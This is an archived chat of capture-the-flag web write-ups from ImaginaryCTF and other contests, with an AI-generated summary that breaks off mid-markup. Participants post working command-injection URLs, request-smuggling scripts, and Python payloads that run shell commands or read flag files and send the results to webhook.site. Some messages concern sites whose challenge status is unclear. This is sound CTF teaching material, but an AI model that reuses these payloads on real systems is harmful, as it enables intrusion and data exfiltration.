@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CTFdi</title>
+  <style>
+    :root {
+        --primary: #ff2e63;   /* neon red/pink */
+        --secondary: #162447;
+        --accent: #08d9d6;    /* neon blue/cyan */
+        --background: #0a0a0f;
+        --surface: rgba(20, 20, 40, 0.9);
+        --text: #e6f1ff;
+    }
+
+    body {
+        font-family: 'Press Start 2P', monospace;
+        background-color: var(--background);
+        color: var(--text);
+        margin: 0;
+        padding: 20px;
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-size: 14px; /* bigger font */
+    }
+
+    .chat {
+        width: 100%;
+        max-width: 800px;
+        height: 500px;
+        overflow-y: auto;
+        background: var(--surface);
+        border-radius: 8px;
+        box-shadow: 0 0 25px rgba(255, 46, 99, 0.3);
+        padding: 12px;
+        display: flex;
+        flex-direction: column-reverse;
+    }
+
+    .message {
+        margin: 12px 0;
+        padding: 10px;
+        border-radius: 6px;
+        background: rgba(15, 15, 25, 0.85);
+        box-shadow: 0 0 6px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+        line-height: 1.5;
+    }
+
+    .timestamp {
+        font-size: 11px;
+        color: var(--primary); /* red timestamps */
+        margin-bottom: 4px;
+        display: block;
+        opacity: 0.55;
+    }
+
+    #summary {
+        width: 100%;
+        max-width: 800px;
+        margin: 30px auto;
+        padding: 20px;
+        background: var(--surface);
+        line-height: 1.6;
+        border-radius: 8px;
+        box-shadow: 0 0 20px rgba(8, 217, 214, 0.3);
+        font-size: 14px;
+    }
+
+    .content a {
+        color: var(--accent); /* blue links */
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    .content a:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+    }
+
+    /* CRT scanline effect */
+    .scanline {
+        background: linear-gradient(to bottom,
+            rgba(255, 255, 255, 0) 0%,
+            rgba(255, 255, 255, 0.05) 10%,
+            rgba(255, 255, 255, 0) 100%);
+        animation: scanline 8s linear infinite;
+        pointer-events: none;
+    }
+
+    @keyframes scanline {
+        0% { transform: translateY(-100%); }
+        100% { transform: translateY(100%); }
+    }
+</style>
+</head>
+<body>
+  <h1>Channel: [data/ctfs/ictf25/web_1263871179966644245.json]</h1>
+  <h3>Writeup Chat</h3>
+  <div id="chat" class="chat">
+    <div class="message">
+      <span class="timestamp">2025-09-08T16:46:26.497000+00:00</span>
+      <div class="content"><a href="https://www.notion.so/pearl-2667c1cedeb08057a579d3d4117b01ea?source=copy_link" target="_blank">https://www.notion.so/pearl-2667c1cedeb08057a579d3d4117b01ea?source=copy_link</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T16:45:48.751000+00:00</span>
+      <div class="content"><a href="https://www.notion.so/imaginary-notes-2667c1cedeb08070b724da63b3ca2e2a?source=copy_link" target="_blank">https://www.notion.so/imaginary-notes-2667c1cedeb08070b724da63b3ca2e2a?source=copy_link</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T12:38:29.182000+00:00</span>
+      <div class="content">you can check . <a href="https://www.youtube.com/@cyberbullet-ypn" target="_blank">https://www.youtube.com/@cyberbullet-ypn</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T12:24:33.433000+00:00</span>
+      <div class="content">there's an easier solution
+```
+<a href="http://pearl.chal.imaginaryctf.org/%0A&lt;command&gt;%7C" target="_blank">http://pearl.chal.imaginaryctf.org/%0A&lt;command&gt;%7C</a>
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T09:28:01.157000+00:00</span>
+      <div class="content"><a href="http://pearl.chal.imaginaryctf.org/x%0Acat%20/flag*%7C" target="_blank">http://pearl.chal.imaginaryctf.org/x%0Acat%20/flag*%7C</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T07:48:30.187000+00:00</span>
+      <div class="content">My solution for codenames-2
+<a href="https://nullbrunk.github.io/posts/imaginaryctf-2025-codenames-2/" target="_blank">https://nullbrunk.github.io/posts/imaginaryctf-2025-codenames-2/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T03:48:02.100000+00:00</span>
+      <div class="content">But I still need comments 🙂
+Why and how it works
+
+```
+#!/bin/sh
+
+curl '<a href="http://localhost:8080/."."/."."/."."/."."/."."/."."/."."/."."/."."/."."/bin/sh%20-c%20"cat%20/flag*"%20|'" target="_blank">http://localhost:8080/."."/."."/."."/."."/."."/."."/."."/."."/."."/."."/bin/sh%20-c%20"cat%20/flag*"%20|'</a>
+```
+
+upd: I see
+<a href="https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html" target="_blank">https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T03:45:08.850000+00:00</span>
+      <div class="content">What is the solution for the Perl task?
+
+upd: I see, <a href="https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/blob/main/Web/pearl/challenge/solve.sh" target="_blank">https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/blob/main/Web/pearl/challenge/solve.sh</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T02:21:34.143000+00:00</span>
+      <div class="content">my solution for pwntools:
+```python
+from pwn import *
+import time
+import requests
+
+HOST, PORT = "127.0.0.1", 3002
+data_url = "<a href="http://127.0.0.1:8080"" target="_blank">http://127.0.0.1:8080"</a>
+
+username = "admin"
+password = "duc193"
+
+def send_bot():
+    r = remote(HOST, PORT)
+    request = f"""POST /visit HTTP/1.1\r\nHost: localhost:8080\r\nX-Target: {data_url}\r\nContent-Length: 0\r\n\r\n"""
+    r.send(request.encode())
+    try:
+        resp = r.recv(timeout=5)
+    except EOFError:
+        pass
+    r.close()
+
+
+if __name__ == "__main__":
+    r = remote(HOST, PORT)
+    chunk1 = (
+        f"POST /register HTTP/1.1\r\n"
+        f"Host: 127.0.0.1\r\n"
+        f"X-Username: {username}\r\n"
+        f"X-Password: {password}\r\n"
+        f"Content-Length: 0\r\n"
+    ).encode()
+    r.send(chunk1)
+
+    send_bot()
+    time.sleep(5)
+    r.send(b"\r\n\r\n")
+
+    try:
+        resp = r.recv(4096, timeout=5)
+        print("[main] resp:", resp.decode(errors="ignore"))
+    except EOFError:
+        pass
+    r.close()
+    print("\n")
+    url = f"<a href="http://{username}:{password}@localhost:3002/flag"" target="_blank">http://{username}:{password}@localhost:3002/flag"</a>
+    res = requests.get(url)
+    print("FLAG:", res.text)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-08T01:22:58.311000+00:00</span>
+      <div class="content"><a href="https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/tree/main/Web/imaginary-notes" target="_blank">https://github.com/ImaginaryCTF/ImaginaryCTF-2025-Challenges/tree/main/Web/imaginary-notes</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T20:13:17.514000+00:00</span>
+      <div class="content">`Accept` is [CORS-safelisted](<a href="https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header)" target="_blank">https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header)</a> and allows `ó` as a value, no idea why it didn't work for you; here's the exact HTML file I used, verified working on local and remote just now. For my solution the charset header is important, should have mentioned it or used `fromCharCode` to sidestep it, sorry about that.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T19:21:01.063000+00:00</span>
+      <div class="content"><a href="https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html" target="_blank">https://www.shlomifish.org/lecture/Perl/Newbies/lecture4/processes/opens.html</a>
+
+you can read this one to understand why does it work :3
+<a href="http://pearl.chal.imaginaryctf.org/%0Als+-la|" target="_blank">http://pearl.chal.imaginaryctf.org/%0Als+-la|</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T19:17:34.374000+00:00</span>
+      <div class="content">you can check my injected code in <a href="https://bot.novacomputertraining.com/t.php" target="_blank">https://bot.novacomputertraining.com/t.php</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T19:09:05.742000+00:00</span>
+      <div class="content">```
+$ curl -s --path-as-is '<a href="http://127.0.0.1:8080/%0als%20-la%20/|'" target="_blank">http://127.0.0.1:8080/%0als%20-la%20/|'</a>
+```
+my local payload</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T19:03:41.240000+00:00</span>
+      <div class="content">pwntools:
+```js
+        (async function () {
+            const injected =
+                "POST /register HTTP/1.1\r\n" +
+                "Host: 127.0.0.1:8080\r\n" +
+                "X-Username: admin\r\n" +
+                "X-Password: pwned\r\n" +
+                "Content-Length: 0\r\n" +
+                "\r\n";
+
+            await fetch("<a href="http://localhost:8080/register"," target="_blank">http://localhost:8080/register",</a> {
+                method: 'POST',
+                body: injected,
+                headers: {
+                    "Accept": "ó".repeat(injected.length),
+                },
+            });
+        })();
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-07T10:04:32.043000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/digging-for-diamonds-never-give-up-gamble-gambling-keep-gambling-gif-15498081004227486559" target="_blank">https://tenor.com/view/digging-for-diamonds-never-give-up-gamble-gambling-keep-gambling-gif-15498081004227486559</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T22:48:00.374000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/familiar-mario-supermarioglitchy4-smg4-skill-issue-gif-27060943" target="_blank">https://tenor.com/view/familiar-mario-supermarioglitchy4-smg4-skill-issue-gif-27060943</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T22:37:33.604000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/stan-twitter-monkey-sad-depressed-bored-gif-14632661802414689947" target="_blank">https://tenor.com/view/stan-twitter-monkey-sad-depressed-bored-gif-14632661802414689947</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T21:33:58.998000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/omori-im-so-dumb-i-feel-so-dumb-dumb-gif-11150433502713575558" target="_blank">https://tenor.com/view/omori-im-so-dumb-i-feel-so-dumb-dumb-gif-11150433502713575558</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T19:34:50.544000+00:00</span>
+      <div class="content"><a href="https://wrong-dirs.onrender.com/redirect?step=0" target="_blank">https://wrong-dirs.onrender.com/redirect?step=0</a> i have to find ctf from this website it keeps redirecting help</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T18:55:41.387000+00:00</span>
+      <div class="content"><a href="http://codenames-1.chal.imaginaryctf.org/" target="_blank">http://codenames-1.chal.imaginaryctf.org/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T18:00:17.788000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/dog-crying-meme-doggo-crys-megan-soo-crying-dog-gif-5276199764143986284" target="_blank">https://tenor.com/view/dog-crying-meme-doggo-crys-megan-soo-crying-dog-gif-5276199764143986284</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T17:38:24.590000+00:00</span>
+      <div class="content">`<a href="https://eth007.me/cert/`" target="_blank">https://eth007.me/cert/`</a> works fine</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T02:24:02.096000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/imgonnabreakmymonitoriswear-gif-26662566" target="_blank">https://tenor.com/view/imgonnabreakmymonitoriswear-gif-26662566</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T00:31:14.080000+00:00</span>
+      <div class="content"><a href="https://youtu.be/ZiDRttW_GvI?t=46" target="_blank">https://youtu.be/ZiDRttW_GvI?t=46</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-06T00:28:14.401000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1413674610930749493" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1413674610930749493</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T22:55:14.256000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/romania-chan-kanye-west-romania-vtuber-gif-26633327" target="_blank">https://tenor.com/view/romania-chan-kanye-west-romania-vtuber-gif-26633327</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T22:49:46.123000+00:00</span>
+      <div class="content"><a href="http://passwordless.chal.imaginaryctf.org/register" target="_blank">http://passwordless.chal.imaginaryctf.org/register</a>
+
+I can't create an email account.</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T21:40:28.193000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1413634303669047306" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1413634303669047306</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T21:33:42.106000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/james-doakes-james-doakes-sus-face-james-doakes-suspicious-james-doakes-reaction-erik-king-gif-14404252364057104628" target="_blank">https://tenor.com/view/james-doakes-james-doakes-sus-face-james-doakes-suspicious-james-doakes-reaction-erik-king-gif-14404252364057104628</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T21:15:10.835000+00:00</span>
+      <div class="content">use <a href="http://passwordless-1.chal.imaginaryctf.org/" target="_blank">http://passwordless-1.chal.imaginaryctf.org/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T21:10:27.677000+00:00</span>
+      <div class="content"><a href="http://passwordless.chal.imaginaryctf.org/" target="_blank">http://passwordless.chal.imaginaryctf.org/</a>
+
+this site cant be reached</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T20:40:42.065000+00:00</span>
+      <div class="content">i can't even access <a href="http://codenames.chal.imaginaryctf.org/" target="_blank">http://codenames.chal.imaginaryctf.org/</a> rn 😭</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-09-05T20:34:19.091000+00:00</span>
+      <div class="content"><a href="https://tenor.com/view/diagnosis-skill-issue-diagnosis-skill-issue-draker-discord-gif-22231351" target="_blank">https://tenor.com/view/diagnosis-skill-issue-diagnosis-skill-issue-draker-discord-gif-22231351</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-29T17:41:51.240000+00:00</span>
+      <div class="content"><a href="https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass?action_solution=voir#ancre_solution" target="_blank">https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass?action_solution=voir#ancre_solution</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2025-08-23T23:37:59.982000+00:00</span>
+      <div class="content">Hello guys, i'm playing a ctf where i have to find the balance of the user "Perik Lin" in this website: <a href="https://harpia-tech.site/" target="_blank">https://harpia-tech.site/</a>
+I found a private PGP key in the YouTube video description embedded, and at <a href="https://harpia-tech.site/backup" target="_blank">https://harpia-tech.site/backup</a> I found encrypted files, but now I'm stuck without knowing how to log in or where to find the password to use the private key. I already looked at the HTML of every page and cookies and found nothing useful.
+Anyone can help me?</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-10-06T15:23:57.121000+00:00</span>
+      <div class="content">Timeworn Code
+436
+That is why updates are important
+
+author: Chuuya
+
+<a href="http://timeworn_code.web.securinets.tn/" target="_blank">http://timeworn_code.web.securinets.tn/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-10-06T15:23:32.003000+00:00</span>
+      <div class="content">0 &amp; 1
+436
+Sometimes 0s and 1s are more than enough , if you are creative that is 🙂
+
+flag name : flag.txt
+
+Author : Chuuya
+
+<a href="http://terminaltreachery2.web.securinets.tn/" target="_blank">http://terminaltreachery2.web.securinets.tn/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-10-06T15:23:07.495000+00:00</span>
+      <div class="content">Securinets
+463
+Sometimes you just need to look inside of S e c u r i n e t s
+
+Author: Chuuya
+
+<a href="http://securinets.web.securinets.tn" target="_blank">http://securinets.web.securinets.tn</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-10-06T15:22:50.282000+00:00</span>
+      <div class="content"><a href="https://friendly.securinets.tn" target="_blank">https://friendly.securinets.tn</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-09-28T11:34:22.852000+00:00</span>
+      <div class="content">Hi guys, help please with task on web - “0day marketplace” - «We are creating marketplaces for selling 0day here, using the most secure and modern technologies.” Flag format:CaspianCTF{A-Za-z0-9} <a href="http://194.87.190.161:12300/" target="_blank">http://194.87.190.161:12300/</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-23T07:55:45.281000+00:00</span>
+      <div class="content">Here's my writeup!
+<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/" target="_blank">https://siunam321.github.io/ctf/ImaginaryCTF-2024/</a>
+- Web
+  1. [crystals](<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/crystals/)" target="_blank">https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/crystals/)</a>
+  2. [The Amazing Race](<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race/)" target="_blank">https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/The-Amazing-Race/)</a>
+  3. [readme2](<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/readme2/)" target="_blank">https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/readme2/)</a>
+  4. [Pwning en Logique](<a href="https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique/)" target="_blank">https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique/)</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-23T06:07:44.996000+00:00</span>
+      <div class="content">this is the code that raises the error:
+<a href="https://github.com/ruby/webrick/blob/15a93914782789520837c334e0c302702aec34e2/lib/webrick/httprequest.rb#L216-L228" target="_blank">https://github.com/ruby/webrick/blob/15a93914782789520837c334e0c302702aec34e2/lib/webrick/httprequest.rb#L216-L228</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-23T06:06:32.265000+00:00</span>
+      <div class="content">this is the code that generates the error page:
+<a href="https://github.com/ruby/webrick/blob/15a93914782789520837c334e0c302702aec34e2/lib/webrick/httpresponse.rb#L443-L471" target="_blank">https://github.com/ruby/webrick/blob/15a93914782789520837c334e0c302702aec34e2/lib/webrick/httpresponse.rb#L443-L471</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T17:49:10.025000+00:00</span>
+      <div class="content">Couldn't solve readme 2 in time, but I just found another bypass.
+```python
+from pwn import *
+
+# HOST, PORT = "readme2.chal.imaginaryctf.org", 80
+HOST, PORT = "localhost", 4000
+EVIL_HOST = "xxx.ngrok.app"
+EVIL = f"<a href="https://{EVIL_HOST}"" target="_blank">https://{EVIL_HOST}"</a>
+io = remote(HOST, PORT)
+
+v = (
+    f"GET x:{EVIL} HTTP/1.1\r\n"
+    f"Host: {EVIL_HOST} \r\n"
+    "\r\n"
+)
+
+io.send(v.encode())
+io.recvuntil(b"\r\n\r\n")
+r = io.recvuntil(b"}")
+print(r)
+```
+
+Uses  the fact that `new URL("x:foobar").pathname == "foobar"`, which doesn't contain `/` at the beginning</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T17:33:39.968000+00:00</span>
+      <div class="content">Another way to get the flag by fixating the seed:
+
+```python
+import requests
+import random
+from app.parse import rgb_parse
+import re
+
+url = "<a href="http://p2c.chal.imaginaryctf.org/"" target="_blank">http://p2c.chal.imaginaryctf.org/"</a>
+
+# Generate combinations
+combos = []
+for i in range(256):
+    random.seed(0)
+    rgb = rgb_parse(chr(i))
+    t = f"({rgb[0]}, {rgb[1]}, {rgb[2]})"
+    combos.append(t)
+
+# Exfil flag
+flag = ""
+for i in range(50):
+    code = f"""
+import random
+random.seed(0)
+with open("/app/flag.txt", "r") as f:
+    return f.read()[{i}]"""
+
+    response = requests.post(url, data={"code": code})
+    match = re.search("rgb(\([0-9]{1,3}, [0-9]{1,3}, [0-9]{1,3}\))", response.text).group(1)
+    ind = combos.index(match)
+    flag += chr(ind)
+    print(flag)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T17:29:35.795000+00:00</span>
+      <div class="content">yeah this would be help <a href="https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T16:54:29.687000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264671239230980126" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264671239230980126</a>
+^</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T16:54:01.648000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264672549976019106" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264672549976019106</a>
+`eth007` **Sunday, July 21, 2024 at 12:57 PM**
+&gt; <a href="https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T13:12:34.131000+00:00</span>
+      <div class="content">[e15](<a href="https://cdn.discordapp.com/emojis/846582011052687370.webp?size=48&amp;quality=lossless&amp;name=e15)" target="_blank">https://cdn.discordapp.com/emojis/846582011052687370.webp?size=48&amp;quality=lossless&amp;name=e15)</a> hope its help</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T08:09:48.546000+00:00</span>
+      <div class="content">forms was mentioned in &lt;#732318949617696828&gt; earlier, no example solution but this link was referenced: <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/" target="_blank">https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/</a>
+..I guess the fail page was missing specification of char encoding and this could be used for XSS somehow</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T06:48:23.657000+00:00</span>
+      <div class="content">format string vulnerability in Prolog's `format`: <a href="https://www.swi-prolog.org/pldoc/man?predicate=format/2" target="_blank">https://www.swi-prolog.org/pldoc/man?predicate=format/2</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-22T03:50:32.602000+00:00</span>
+      <div class="content">[clowncheems~4](<a href="https://cdn.discordapp.com/emojis/846577915093057546.webp?size=48&amp;quality=lossless&amp;name=clowncheems%7E4)" target="_blank">https://cdn.discordapp.com/emojis/846577915093057546.webp?size=48&amp;quality=lossless&amp;name=clowncheems%7E4)</a> the error is simply throw out with the hostname if the request path contains special character</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T23:08:08.375000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264695469377065122" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264695469377065122</a>
+i shall continue the refer stack</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T22:11:55.328000+00:00</span>
+      <div class="content"><a href="https://yun.ng/c/ctf/2024-ictf/misc/zable" target="_blank">https://yun.ng/c/ctf/2024-ictf/misc/zable</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T22:04:57.979000+00:00</span>
+      <div class="content"><a href="https://yun.ng/c/ctf/2024-ictf/web/journal" target="_blank">https://yun.ng/c/ctf/2024-ictf/web/journal</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T21:28:16.805000+00:00</span>
+      <div class="content">I will refer to you to the one who referred me
+<a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264676987625013321" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264676987625013321</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T21:17:45.535000+00:00</span>
+      <div class="content">My p2c sol
+
+```python
+import requests
+import string
+import re
+
+flag = ""
+i = 0
+while not flag.endswith("}"):
+    for c in string.printable:
+        payload = """import parse\nfound = False\nflag = open("flag.txt").read().strip()\nif flag[INDEX] == CHAR:\n    found = True\ndef a(*args):\n    return 0\nif found:\n    parse.int = a"""
+        payload = payload.replace("INDEX", str(i)).replace("CHAR", repr(c))
+        res = requests.post("<a href="http://p2c.chal.imaginaryctf.org/"," target="_blank">http://p2c.chal.imaginaryctf.org/",</a> data="code=%s" % payload, headers={"content-type":"application/x-www-form-urlencoded"})
+        rr = res.text[res.text.rfind("changeBackgroundColor("):res.text.rfind(";")]
+        if re.search(r"\(29, [0-9]+, 49\)", rr):
+            flag += c
+            i += 1
+            print("FOUND", flag)
+            break
+        print(c)
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T20:38:36.375000+00:00</span>
+      <div class="content"><a href="https://yun.ng/c/ctf/2024-ictf/web/amazing-race" target="_blank">https://yun.ng/c/ctf/2024-ictf/web/amazing-race</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T20:37:27.976000+00:00</span>
+      <div class="content">```python
+import requests
+
+while True:
+    payload=f"""
+from urllib.request import urlopen, Request
+import os
+httprequest = Request(' <a href="https://webhook.site/',data=os.popen('{input("$" target="_blank">https://webhook.site/',data=os.popen('{input("$</a> ").strip()}').read().encode(),method='POST')
+urlopen(httprequest)""".strip()
+    requests.post("<a href="http://p2c.chal.imaginaryctf.org/"," target="_blank">http://p2c.chal.imaginaryctf.org/",</a> data={"code": payload})
+    
+# $ ls
+# $ cat flag.txt
+# ictf{d1_color_picker_fr_2ce0dd3d}
+```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T20:35:48.529000+00:00</span>
+      <div class="content">my p2c solve:
+```python
+import http.client
+import urllib.parse
+
+url = "<a href="https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"" target="_blank">https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"</a>
+parsed_url = urllib.parse.urlparse(url)
+
+with open('flag.txt', 'r') as file:
+    flag_content = file.read()
+
+post_data = urllib.parse.urlencode({"flag": flag_content})
+
+connection = http.client.HTTPSConnection(parsed_url.netloc)
+connection.request(
+    "POST",
+    parsed_url.path,
+    body=post_data,
+    headers={"Content-Type": "application/x-www-form-urlencoded"}
+)```</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T20:14:50.412000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264661649994940496" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264661649994940496</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:57:12.394000+00:00</span>
+      <div class="content"><a href="https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors" target="_blank">https://xsleaks.dev/docs/attacks/navigations/#inflation-server-side-errors</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:56:48.359000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/732318949617696828/1264663614464458903" target="_blank">https://discord.com/channels/732308165265326080/732318949617696828/1264663614464458903</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:48:53.058000+00:00</span>
+      <div class="content">for example in Journal -&gt; `<a href="http://journal.chal.imaginaryctf.org/?file=','..')||printf(file_get_contents('URL_FOR_XSS'))||strpos('`" target="_blank">http://journal.chal.imaginaryctf.org/?file=','..')||printf(file_get_contents('URL_FOR_XSS'))||strpos('`</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:42:53.634000+00:00</span>
+      <div class="content"><a href="https://discord.com/channels/732308165265326080/1263871179966644245/1264664038785417258" target="_blank">https://discord.com/channels/732308165265326080/1263871179966644245/1264664038785417258</a></div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:23:23.168000+00:00</span>
+      <div class="content">For forms: <a href="https://discord.com/channels/732308165265326080/732318949617696828/1264661064226705524" target="_blank">https://discord.com/channels/732308165265326080/732318949617696828/1264661064226705524</a>
+Implementing it is left as an exercise for the reader 😉</div>
+    </div>
+    <div class="message">
+      <span class="timestamp">2024-07-21T19:13:53.636000+00:00</span>
+      <div class="content">web/readme intended 🥲 :
+```
+curl --path-as-is '<a href="http://readme.chal.imaginaryctf.org/flag.txt/.'" target="_blank">http://readme.chal.imaginaryctf.org/flag.txt/.'</a>
+```
+
+
+web/readme2 intended (I know you can cheese it by double slash 🥲 ):
+```
+printf 'GET /.. HTTP/1.0\r\nHost: fakehost/fla\tg.txt\r\n\r\n' | nc readme2.chal.imaginaryctf.org 80
+```</div>
+    </div>
+  </div>
+  <h3>Gemini Chat Summary</h3>
+  <section id="summary">
+<div style="font-family: sans-serif; line-height: 1.6;">
+    <h2>Comprehensive Analysis of a Technical CTF Discussion</h2>
+    <p>This document summarizes a dense, technical conversation among Capture The Flag (CTF) participants. The discussion primarily revolves around solving web security challenges from various competitions, notably ImaginaryCTF 2025. Participants share solutions, code snippets, exploit techniques, and valuable resources for a wide range of vulnerabilities.</p>
+
+    <section>
+        <h3>Key Challenges and Exploitation Techniques</h3>
+
+        <article style="margin-bottom: 2em; border-left: 3px solid #ccc; padding-left: 1em;">
+            <h4>Challenge: "pearl" (ImaginaryCTF)</h4>
